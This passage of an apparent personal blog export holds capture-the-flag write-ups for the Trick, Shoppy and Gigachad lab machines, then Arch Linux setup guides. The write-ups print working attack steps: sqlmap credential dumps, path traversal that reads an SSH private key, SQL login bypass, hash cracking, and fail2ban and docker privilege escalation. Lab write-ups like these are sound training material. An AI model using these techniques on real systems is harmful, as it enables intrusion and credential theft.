@trick.htb Output: ;; communications error to 10.10.11.166#53: connection refused ;; communications error to 10.10.11.166#53: connection refused ;; communications error to 10.10.11.166#53: connection refused ; &lt;&lt;&gt;&gt; DiG 9.18.7 &lt;&lt;&gt;&gt; a trick.htb @trick.htb ;; global options: +cmd ;; no servers could be reached the port 53 is closed, should I reset the machine ? Lol, it was the solution.https://stackoverflow.com/questions/131989/how-do-i-get-a-list-of-all-subdomains-of-a-domain dig axfr trick.htb @trick.htb preprod-payroll.trick.htbI have to add it to /etc/hosts. wfuzzdirectorywfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 'http://preprod-payroll.trick.htb/FUZZ' Login page There is a login page, let’s try sqlmap. sqlmap don’t find anything, I think he need the user agent or the cookie. Output: curl &#39;http:&#x2F;&#x2F;preprod-payroll.trick.htb&#x2F;ajax.php?action&#x3D;login&#39; -X POST -H &#39;User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0&#39; -H &#39;Accept: *&#x2F;*&#39; -H &#39;Accept-Language: en-US,en;q&#x3D;0.5&#39; -H &#39;Accept-Encoding: gzip, deflate&#39; -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&#39; -H &#39;X-Requested-With: XMLHttpRequest&#39; -H &#39;Origin: http:&#x2F;&#x2F;preprod-payroll.trick.htb&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Referer: http:&#x2F;&#x2F;preprod-payroll.trick.htb&#x2F;login.php&#39; -H &#39;Cookie: PHPSESSID&#x3D;vle17ll7puj0b1kblu8c40ue3r&#39; --data-raw &#39;username&#x3D;fgh&amp;password&#x3D;fgh&#39; sqlmapReplace curl by sqlmap and add -dbs to list the databases. Now I’m gonna list the tables in the database. sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=vle17ll7puj0b1kblu8c40ue3r' --data-raw 'username=fgh&amp;password=fgh' -D payroll_db --tables Now dump the user table: sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=vle17ll7puj0b1kblu8c40ue3r' --data-raw 'username=fgh&amp;password=fgh' -D payroll_db -T users --dump Output: Database: payroll_db Table: users [1 entry] +----+-----------+---------------+------+---------+---------+-----------------------+------------+ | id | doctor_id | name | type | address | contact | password | username | +----+-----------+---------------+------+---------+---------+-----------------------+------------+ | 1 | 0 | Administrator | 1 | &lt;blank&gt; | &lt;blank&gt; | SuperGucciRainbowCake | Enemigosss | +----+-----------+---------------+------+---------+---------+-----------------------+------------+ I can use theres creds to login. Website 1LFIWhen I saw the index.php?page= I’ve tried to exploit it with wfuzz, but didn’t found anything. wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --sc 200 'http://preprod-payroll.trick.htb/index.php?page=../../../../../../../FUZZ' If I can’t exploit it maybe there is some informations to gather. Subdomainwfuzzwfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://trick.htb' -H \"Host: FUZZ.trick.htb\" >> subdomains &amp; Found nothing.The last subdomain was preprod-payroll, because it’s a preprod server.So I should keep the word preprod and try again wfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://trick.htb' -H \"Host: preprod-FUZZ.trick.htb\" >> subdomains &amp; Now I know for what was made the last website, to find this subdomain. Website 2http://preprod-marketing.trick.htb Ok, I have to add it to /etc/hosts. And Voila. It was made with this template: https://templatemo.com/tm-547-real-dynamic We have few users: Erik Morris Michael Owen Mary Kay Jen Terry Levi Moore And again, the ?page=. wfuzz I wanted to try few wordlist. wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --sc 200 'http://preprod-marketing.trick.htb/index.php?page=../../../../../../../FUZZ' >> fli.txt &amp; http://preprod-marketing.trick.htb/index.php?page=….//….//….//….//….//….//….//….//….//etc/passwd Yeah !michael is a user.Let’s get the flag.http://preprod-marketing.trick.htb/index.php?page=….//….//….//….//….//….//….//….//….//home/michael/user.txtNow let’s grab the private ssh key.http://preprod-marketing.trick.htb/index.php?page=….//….//….//….//….//….//….//….//….//home/michael/.ssh/id_rsa sudo exploitsudo -l Output: Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin User michael may run the following commands on trick: (root) NOPASSWD: &#x2F;etc&#x2F;init.d&#x2F;fail2ban restart We have to play with fail2ban, there is nothing in gtfobin. https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7I have to play with the file iptables-multiport.conf, but I can’t write in it.So I have to copy it somewhere and move it to replace the original one. then add the line actionban = chmod u+s /bin/bash in the file iptables-multiport.conf.Reboot the service with sudo /etc/init.d/fail2ban restartTry to login 5 times via ssh without the private key and without a password.Now you can use bash -p to become root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://peanutstick.github.io/tags/sqlmap/"}]},{"title":"CTF Choppy","slug":"CTF Choppy","date":"2021-10-02T07:15:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF Choppy.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Choppy.html","excerpt":"","text":"Rustscanrustscan -a 10.10.11.180 Output: PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 9093&#x2F;tcp open copycat syn-ack /etc/hostsecho \"10.10.11.180 shoppy.htb\" >> /etc/hosts Port 80Subdomain listingwfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://shoppy.htb' -H \"Host: FUZZ.shoppy.htb\" --hw 9000 --sc 200 Add mattermost.shoppy.htb to /etc/hosts Gobustergobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard switch Output: &#x2F;images (Status: 301) [Size: 179] [--&gt; &#x2F;images&#x2F;] &#x2F;login (Status: 200) [Size: 1074] &#x2F;admin (Status: 302) [Size: 28] [--&gt; &#x2F;login] &#x2F;assets (Status: 301) [Size: 179] [--&gt; &#x2F;assets&#x2F;] &#x2F;css (Status: 301) [Size: 173] [--&gt; &#x2F;css&#x2F;] &#x2F;Login (Status: 200) [Size: 1074] &#x2F;js (Status: 301) [Size: 171] [--&gt; &#x2F;js&#x2F;] &#x2F;fonts (Status: 301) [Size: 177] [--&gt; &#x2F;fonts&#x2F;] &#x2F;Admin (Status: 302) [Size: 28] [--&gt; &#x2F;login] &#x2F;exports (Status: 301) [Size: 181] [--&gt; &#x2F;exports&#x2F;] &#x2F;LogIn (Status: 200) [Size: 1074] &#x2F;LOGIN (Status: 200) [Size: 1074] Login pagehttp://shoppy.htb/login You can bypass the login pageI will use burpsuite to intercept the trafic. While I was playing with burpsuite I go an interesting error: We have an username jaeger./home/jaeger/ShoppyApp/node_modules/body-parser/lib/types/json.js Bypass auth login pageWhen I put a ‘ the page take more time to load.https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypassI from this liste I took this &#39;||&#39;2 and add admin at the beggining. Searsh for userI have to search for a user, it’s not working with jaeger. I enter &#39;||&#39;2 to find a new user, josh. Crack the passwordThis is a hash, probably MD5.6ebcea65320589ca4f2f1ce039975995https://www.dcode.fr/cipher-identifier echo \"6ebcea65320589ca4f2f1ce039975995\" > hash hashcat -m 0 hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt remembermethisway Mattermosthttp://mattermost.shoppy.htb/login jaeger is a linux user, I saw him in the error with burpsuite.Let’s use ssh. jaegerssh jaeger@shoppy.htb sudo -l sudo -u deploy /home/deploy/password-manager I don’t have the password, if I use strings I see nothing but with cat it’s working. Sample deployssh deploy@shoppy.htb Deploying@pp!I’m using lse again. I can use docker, I can also exploit it with GTFOBins.https://gtfobins.github.io/gtfobins/docker/ docker run -v /:/mnt --rm -it alpine chroot /mnt sh I’m root","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Setup Xfce with i3","slug":"Run non steam game with proton on lutris","date":"2021-09-15T10:40:00.000Z","updated":"2023-04-12T14:33:07.234Z","comments":true,"path":"/post/Run non steam game with proton on lutris.html","link":"","permalink":"https://peanutstick.github.io/post/Run%20non%20steam%20game%20with%20proton%20on%20lutris.html","excerpt":"","text":"Run non steam game with proton on lutrisInstall Steam and proton.On steam:Setings &gt; Steam Play and toggle the option “Enable Steam Play for Supported Titles”. Now you can select the last version of Proton and download it via steam. Copy Proton folder.You have to copy the proton folder:.steam/root/steamapps/common/And past it wher you want, for me it’s here:.local/share/lutris/runners/wine/ It’s look like this for me:cp .steam/root/steamapps/common/Proton\\ 6.3 .local/share/lutris/runners/wine/Proton\\ 6.3 -R Configure lutrisIn the Runners section eddit wine: Runner optionsWine version: CustomCustom Wine executable: /home/username/.local/share/lutris/runners/Proton 6.3/dist/bin/wine System optionsDisable lutris Runtime: YesRun in a terminal: YesEnvironment variables: AddKey: STEAM_COMPAT_DATA_PATHValue: /path/to/your/gamesPre-launch script: /home/peanutstick/.local/share/lutris/runners/Proton 6.3/protonWait for pre-launch script completion: YesSave Now your games who run with wine will use proton.","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux, Gaming","slug":"Linux-Gaming","permalink":"https://peanutstick.github.io/tags/Linux-Gaming/"}]},{"title":"Add windows to grub","slug":"Add windows to grub","date":"2021-08-28T13:54:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/Add windows to grub.html","link":"","permalink":"https://peanutstick.github.io/post/Add%20windows%20to%20grub.html","excerpt":"","text":"FilesI’t write DO NOT EDIT THIS FILEBut I’ve done it, it was useless, I think I had to do it only if I was on MBR.I added this content in this file Techbrown/boot/grub/grub.cfg This file was used to enable os-prober/etc/default/grub Install OS-Probersudo pacman -S os-prober Run it:sudo os-prober Output:/dev/sda2@/efi/Microsoft/Boot/bootmgfw.efi:Windows Boot Manager:Windows:efi Enable os-prober in grubedit /etc/default/grubadd GRUB_DISABLE_OS_PROBER=false Update grubsudo grub-mkconfig -o /boot/grub/grub.cfg","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Set Polybar on 2 screens","slug":"Set Polybar on 2 screens","date":"2021-08-08T10:15:00.000Z","updated":"2023-04-12T14:33:07.234Z","comments":true,"path":"/post/Set Polybar on 2 screens.html","link":"","permalink":"https://peanutstick.github.io/post/Set%20Polybar%20on%202%20screens.html","excerpt":"","text":"ConfigIn ~/.config/polybar/configWat is your bar, by default it’s exemple, but mine is Bar.You should add monitor. [bar&#x2F;Bar] monitor &#x3D; $&#123;env:MONITOR:&#125; launch.shIn ~/.config/polybar/launch.shAdd this. if type &quot;xrandr&quot;; then for m in $(xrandr --query | grep &quot; connected&quot; | cut -d&quot; &quot; -f1); do MONITOR&#x3D;$m polybar --reload Bar &amp; done else polybar --reload Bar &amp; fi To avoid 2 bars on the main screen comment the line you used to launch it. #polybar Bar 2&gt;&amp;1 | tee -a &#x2F;tmp&#x2F;polybar1.log &amp; disown","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Fix the blur with picom","slug":"Fix the blur with picom","date":"2021-07-19T04:40:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/Fix the blur with picom.html","link":"","permalink":"https://peanutstick.github.io/post/Fix%20the%20blur%20with%20picom.html","excerpt":"","text":"Fix the blur with picomuninstall picomThe blur is avalaible only for the git version,So if you have it from pacman you have to remove it. sudo pacman -R picom Install picomThis is the git:https://aur.archlinux.org/packages/picom-git/ git clone https:&#x2F;&#x2F;aur.archlinux.org&#x2F;picom-git.git cd picon-git makepkg -si Start it with i3I have to add experimental-backends in my config..config/i3/config exec --no-startup-id picom -b --experimental-backends Picom confI have nothing to add on it but you can modify things like you want..config/picom/picom.conf","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Configure the touchpad [I3]","slug":"Configure_touchpad_on_i3","date":"2021-07-16T08:16:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/Configure_touchpad_on_i3.html","link":"","permalink":"https://peanutstick.github.io/post/Configure_touchpad_on_i3.html","excerpt":"","text":"Configure the touchpad [I3]Config:Let’s use xorg server and create the file:sudo mkdir /etc/X11/xorg.conf.d/90-touchpad.confNow edit it: Section &quot;InputClass&quot; Identifier &quot;touchpad&quot; MatchIsTouchpad &quot;on&quot; Driver &quot;libinput&quot; Option &quot;Tapping&quot; &quot;on&quot; Option &quot;TappingButtonMap&quot; &quot;lrm&quot; # lrm &#x3D; right click lmr &#x3D; middle click Option &quot;NaturalScrolling&quot; &quot;on&quot; Option &quot;ScrollMethod&quot; &quot;twofinger&quot; # 2 fingers to scroll EndSection And reboot.","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Send a file via ssh","slug":"Send a file via ssh","date":"2021-07-14T10:15:00.000Z","updated":"2023-04-12T14:14:27.277Z","comments":true,"path":"/post/Send a file via ssh.html","link":"","permalink":"https://peanutstick.github.io/post/Send%20a%20file%20via%20ssh.html","excerpt":"","text":"Send a file via sshCommandThe file you want to send:/var/www/html/index.html The destination:user@IP:/home/peanutstick/Document/index.htmlSo the command will be:scp /var/www/html/index.html user@IP:/home/peanutstick/index.html You can add -P to specify the port.It take too much time to write and if it’s always the same destination directory you can write a fonction. FonctionIn the .bashrc. send() &#123; scp -P 8765 &#x2F;home&#x2F;peanutstick&#x2F;Documents&#x2F;markdown&#x2F;&quot;$1&quot; peanutstick@65.21.51.64:&#x2F;var&#x2F;www&#x2F;html&#x2F;peanutstick.com&#x2F;source&#x2F;_posts&#x2F;&quot;$1&quot; &#125; Usage:send My_post.mdYou can rename send like you want.The $1 will be My_post.md. I use it now because I was writing my post directly from the VPS because I’m too lazy to open filezilla and click click everywhere.The problem by writing it directly on the VPS via ssh is if you are incative too much time, you will loose the connection and the work will be not saved.","categories":[],"tags":[]},{"title":"Install nvidia driver on Arch Linux","slug":"Install nvidia driver on Arch Linux","date":"2021-07-13T23:48:00.000Z","updated":"2023-04-12T14:41:17.131Z","comments":true,"path":"/post/Install nvidia driver on Arch Linux.html","link":"","permalink":"https://peanutstick.github.io/post/Install%20nvidia%20driver%20on%20Arch%20Linux.html","excerpt":"","text":"Install and configure nvidia driver on Arch LinuxFind the right driverTo install your driver you should read the wiki, my solution may not work for you.NVIDIA - ArchWiki To see what graphics card you have:lspci -k | grep -A 2 -E &quot;(VGA|3D)&quot; Output 00:02.0 VGA compatible controller: Intel Corporation CoffeeLake-H GT2 [UHD Graphics 630] Subsystem: Lenovo Device 39fe Kernel driver in use: i915 -- 01:00.0 VGA compatible controller: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] (rev a1) Subsystem: Lenovo Device 39fe Kernel driver in use: nvidia Wish driver you need:CodeNamesThis is what i have:NV137 (GP107) GeForce GTX (1050, 1050 Ti)I’m above NV110 so I install the nvidia drinver and not the nvidia-lts one. sudo pacman -S nvidia nvidia-utils nvidia-prime nvidia-settings I use prime-run for the moment to use my GPU only when I need, but I will try NVIDIA Optimus.D’ont create a conf file for Xorg, the conf is inplemented in the driver. Configure mkinitcpioThe doc:Early KMS startDRM_Kernel_mode_settingIn the file /etc/mkinitcpio.confReplace MODULES=() by MODULES=(i915 nvidia). TestsEnable ssh:sudo systemctl enable sshdFirst thing to do is reboot:It can work now but if it’s broken after the rebbot it’s useless. Download glxinfo from AUR:prime-run glxinfoIf you have an output without errror it’s good.The nvidia setting: nvidia-setting You should download nvtop via pacman: sudo pacman -S nvtop And run nvtop to see the consumption.","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Restore a backup with timeshift","slug":"Restore a backup with timeshift","date":"2021-07-12T07:59:00.000Z","updated":"2023-04-12T14:14:27.277Z","comments":true,"path":"/post/Restore a backup with timeshift.html","link":"","permalink":"https://peanutstick.github.io/post/Restore%20a%20backup%20with%20timeshift.html","excerpt":"","text":"Restore a backup with timeshiftFix Linux Created At : 2021-07-12 01:59 Count:127 Views 👀 :2213 Restore a backup with timeshiftmount the partitionsmount &#x2F;dev&#x2F;nvme0n1p2 &#x2F;mnt mount &#x2F;dev&#x2F;nvme0n1p3 &#x2F;mnt&#x2F;home Chrootarch-chroot &#x2F;mnt &#x2F;bin&#x2F;bash restoretimeshift --restore Select snapshot: 0 &gt; 2021-07-08_20-00-02 D W1 &gt; 2021-07-09_21-00-02 D2 &gt; 2021-07-10_00-00-37 O3 &gt; 2021-07-10_15-00-35 O4 &gt; 2021-07-10_16-48-33 O5 &gt; 2021-07-11_10-00-02 D6 &gt; 2021-07-11_12-23-57 O I will take the last one:6Re-install GRUB2 bootloader?NDo you know the risk ?YAnd now you have to wait until it’s done. if you see Restore completed you can continue. unmount &amp; rebootexit umount -R &#x2F;mnt reboot","categories":[],"tags":[]},{"title":"Add a partition in linux","slug":"Add a partition in linux","date":"2021-07-11T09:06:00.000Z","updated":"2023-04-12T14:14:27.237Z","comments":true,"path":"/post/Add a partition in linux.html","link":"","permalink":"https://peanutstick.github.io/post/Add%20a%20partition%20in%20linux.html","excerpt":"","text":"Create the new partitionCreate the partitionchose the hard drive: fdisk -l And them create the partition: cfdisk &#x2F;dev&#x2F;sda Once it’s done you have to set the type. mkfs.ext4 &#x2F;dev&#x2F;sda2 For me it’s sda2 because I already use sda1 for the downloads, the sda2 will be for my games. Create the directoryCreate the directory for the partition: mkdir &#x2F;home&#x2F;peanutstick&#x2F;games And give the own: sudo chown peanutstick $HOME&#x2F;games -R Mount the partitionmount &#x2F;dev&#x2F;sda2 &#x2F;home&#x2F;peanutstick&#x2F;games Set it in fstabIf you don’t do if the changes will not be saved after a reboot. sudo vim &#x2F;etc&#x2F;fstab Now add this: &#x2F;dev&#x2F;sda2 &#x2F;home&#x2F;peanutstick&#x2F;games ext4 defaults 0 0","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[]},{"title":"Get a shell when Arch Linux is broken","slug":"Get a shell when Arch Linux is broken","date":"2021-07-07T12:55:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/Get a shell when Arch Linux is broken.html","link":"","permalink":"https://peanutstick.github.io/post/Get%20a%20shell%20when%20Arch%20Linux%20is%20broken.html","excerpt":"","text":"Get a shell when arch don’t bootBoot on a USB LiveGo to the boot menu and select the USB key with arch Select Arch Linux install medium LoadkeysI will set my keyboard in french: loadkeys fr Mount the partitionwith fdisk -l locate the right device I have: /dev/nvme0n1p1 for the boot /dev/nvme0n1p2 for the system /dev/nvme0n1p3 for the swap I will mount the system: mount &#x2F;dev&#x2F;nvme0n1p2 &#x2F;mnt chrootedarch-chroot &#x2F;mnt &#x2F;bin&#x2F;bash","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[]},{"title":"Installing AUR packages","slug":"Installing AUR packages","date":"2021-07-04T19:45:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/Installing AUR packages.html","link":"","permalink":"https://peanutstick.github.io/post/Installing%20AUR%20packages.html","excerpt":"","text":"Installing AUR packagesOs Linux Created At : 2021-07-04 13:45 Count:72 Views 👀 :2217 Installing AUR packagesInstall gitsudo pacman -S git Install base develsudo pacman -S base-devel Find the packageVisit AUR: https://aur.archlinux.org/ find the git clone URL of the chosen package. it should look like this: https://aur.archlinux.org/opencv3-opt.git Create directoryIf it’s your first package you should create a directory for the AUR packages mkdir ~&#x2F;AUR Build itgit clone [the package], cd [the package], makepkg -si ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"arch","slug":"arch","permalink":"https://peanutstick.github.io/tags/arch/"}]},{"title":"Arch Linux installation guide","slug":"Arch Linux installation guide","date":"2021-07-01T10:15:00.000Z","updated":"2023-04-12T14:14:27.241Z","comments":true,"path":"/post/Arch Linux installation guide.html","link":"","permalink":"https://peanutstick.github.io/post/Arch%20Linux%20installation%20guide.html","excerpt":"","text":"Install Arch on nvme drive, UEFI system[Change layoutI will set the layout in French, because I am French. loadkeys fr Set passwordThis is the first step for me, because without password I can’t use SSH. passwd Connect via SSHI will use ssh to copy past the commands,To get you’r IP addresse. ip a look like this for me: 192.168.0.25 On your other computer open a terminal or putty of what you want to connect via SSH. Partitionsto see your hard drive. fdisk -l Delete them. cfdisk &#x2F;dev&#x2F;nvme0n1 cfdisk &#x2F;dev&#x2F;sda Create 3 partition, 1: 512Mb EFI 2: 20Gb File system (root) 2: 80Gb File system (home) And Format them: This one for EFI mkfs.fat -F32 &#x2F;dev&#x2F;nvme0n1p1 The two other like this: mkfs.ext4 &#x2F;dev&#x2F;nvme0n1p2 mkfs.ext4 &#x2F;dev&#x2F;nvme0n1p3 Them mount the root partition mount &#x2F;dev&#x2F;nvme0n1p2 &#x2F;mnt mkdir &#x2F;mnt&#x2F;home mount &#x2F;dev&#x2F;nvme0n1p3 &#x2F;mnt&#x2F;home Install the systempacstrap -i &#x2F;mnt base linux linux-firmware sudo nano Generate fstab filegenfstab -U -p &#x2F;mnt &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;fstab Chroot to the installed systemarch-chroot &#x2F;mnt &#x2F;bin&#x2F;bash Set root passwordTo set a root password passwd Create a new useruseradd peanutstick -m set the password passwd peanutstick Set localeuncomment the right line, for me it’s fr_FR.UTF-8 UTF-8, because I am French! nano &#x2F;etc&#x2F;locale.gen now generate it. locale-gen Create a locale.conf file. echo &quot;LANG&#x3D;fr_FR.UTF-8 UTF-8&quot; &gt; &#x2F;etc&#x2F;locale.conf Set the time zoneln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F; Now select your time zone ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Europe&#x2F;Paris &#x2F;etc&#x2F;localtime Set local timehwclock --systohc --utc To check it: date Set hostnameecho peanutstick &gt; &#x2F;etc&#x2F;hostname Also add the name in /etc/hosts nano &#x2F;etc&#x2F;hosts it should look like this: 127.0.0.1 localhost ::1 localhost 127.0.1.1 peanutstick Enable networkInstall the network manager: pacman -S networkmanager Enable it: systemctl enable NetworkManager If you don’t do this part, your computer will not be able to connect to the network and you will not be able to download the packet. Install GRUBInstall Grub and efibootmgr pacman -S grub efibootmgr install the bootlader: mkdir &#x2F;boot&#x2F;efi mount &#x2F;dev&#x2F;nvme0n1p1 &#x2F;boot&#x2F;efi grub-install --target&#x3D;x86_64-efi --bootloader-id&#x3D;GRUB --efi-directory&#x3D;&#x2F;boot&#x2F;efi --removable grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg Rebootexit umount -R &#x2F;mnt reboot Change boot orderdon’t pull out the USD stick, and select the last option to change the settings. Set the right boot order, to boot on your hdd or ssd. Disable speakerMy computer do a big BIP when I press tab or do something wrong: rmmod pcspkr To make it persistent: nano &#x2F;etc&#x2F;modprobe.d&#x2F;nobeep.conf And write: blacklist pcspkr Permanent KEYMAPnano &#x2F;etc&#x2F;vconsole.conf I will write: KEYMAP&#x3D;fr Add User to SudoersAs root: nano &#x2F;etc&#x2F;sudoers add this to the end: peanutstick ALL&#x3D;(ALL) NOPASSWD:ALL Be careful, the user can be root by just typing sudo su, sudo /bin/bash and more Install sshdpacman -S openssh Swap FileYou probably have noticed that I have not created a Swap partition. It’s because this guy in this tutorial recommend to use swap file: https://averagelinuxuser.com/linux-swap/ Create a Swap file of 3G or whatever your RAM size is: fallocate -l 3G &#x2F;swapfile Change its access rules, format and enable it: chmod 600 &#x2F;swapfile mkswap &#x2F;swapfile swapon &#x2F;swapfile Also, add this Swap file to the /etc/fstab: echo &#39;&#x2F;swapfile none swap sw 0 0&#39; &gt;&gt; &#x2F;etc&#x2F;fstab And check if the Swap file is working: free -m Install X window system and audiopacman -S pulseaudio pulseaudio-alsa xorg xorg-xinit xorg-server Enter to select all. Install desktop environmentInstall xorg: sudo pacman -S xorg xorg-server This is for mate. sudo pacman -S mate mate-extra lightdm lightdm-gtk-greeter But I preffer Xfce: sudo pacman -S --needed xfce4 mousepad parole ristretto thunar-archive-plugin thunar-media-tags-plugin xfce4-battery-plugin xfce4-datetime-plugin xfce4-mount-plugin xfce4-netload-plugin xfce4-notifyd xfce4-pulseaudio-plugin xfce4-screensaver xfce4-taskmanager xfce4-wavelan-plugin xfce4-weather-plugin xfce4-whiskermenu-plugin xfce4-xkb-plugin file-roller network-manager-applet leafpad epdfview galculator lightdm lightdm-gtk-greeter lightdm-gtk-greeter-settings capitaine-cursors arc-gtk-theme xdg-user-dirs-gtk Enable the lightDM service to start on boot. sudo systemctl enable lightdm Finally, reboot your ArchLinux system. sudo reboot","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Arch","slug":"Arch","permalink":"https://peanutstick.github.io/tags/Arch/"}]},{"title":"CTF-gigachad","slug":"CTF-gigachad","date":"2021-07-01T10:15:00.000Z","updated":"2023-04-12T15:10:22.386Z","comments":true,"path":"/post/CTF-gigachad.html","link":"","permalink":"https://peanutstick.github.io/post/CTF-gigachad.html","excerpt":"","text":"CTF-gigachadDiscoverylink: vulnhub-GAGACHADThe only information we have it’s there is multiple flags. Discovery and Scanning[netdiscoverFast scan with netdiscover. sudo netdiscover -r 192.168.0.0&#x2F;16 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor &#x2F; Hostname ---------------------------------------------------------------------------- 192.168.0.19 08:00:27:d0:52:bc 1 42 PCS Systemtechnik GmbH nmapsudo nmap -sV -p- 192.168.0.19 Nmap scan report for 192.168.0.19 Host is up (0.00010s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21&#x2F;tcp open ftp vsftpd 3.0.3 22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 08:00:27:D0:52:BC (Oracle VirtualBox virtual NIC) Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel We have the port 21, 22 and 80 open and it’s a debian machine. port 80Let’s to to http://192.168.0.19 and see what I can find.With the inspector(F12) I found a key:A7F9B77C16A3AA80DAA4E378659226F628326A95 D82D10564866FD9B201941BCC6C94022196F8EE8 DirbusterI run a dirbuster with a common wordlist.dirbuster -u http://192.168.0.19/ -l Wordlist-common.txtOh… I found 500 directories, I stop the scan, it’s useless HashIs an SHA-1 hash:a7f9b77c16a3aa80daa4e378659226f628326a95 = fuck youD82D10564866FD9B201941BCC6C94022196F8EE8 = VIRGINMaybe it’s a password or a user. I got all what I need so I can go to the FTP part. port 21ftp 192.168.0.19bash: ftp : commande introuvableoh, I use arch BTW (and I’m french)sudo pacman -S inetutilsNow we can play.ftp 192.168.0.19user: anonymouspassword: password 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; I’m in, let’s see what we can have with ls. -r-xr-xr-x 1 1000 1000 297 Feb 07 17:33 chadinfo Good, I have to read it.Download: ftp&gt;get chadinfoRead: cat chadinfo PK 0 HR���ƃchadinfoUT �j &#96;Zj &#96;ux why yes, ####################### username is chad ??????????????????????? password? !!!!!!!!!!!!!!!!!!!!!!! go to &#x2F;drippinchad.png PK 0 HR���ƃ��chadinfoUT�j &#96;ux PKN� User: chadPassword: in the image drippinchad.pnghttp://192.168.0.19/drippinchad.png I will use google image to see where is it.It’s maiden&#39;s tower it should be the password.After multiples attempts the password is maidenstower I’m connected 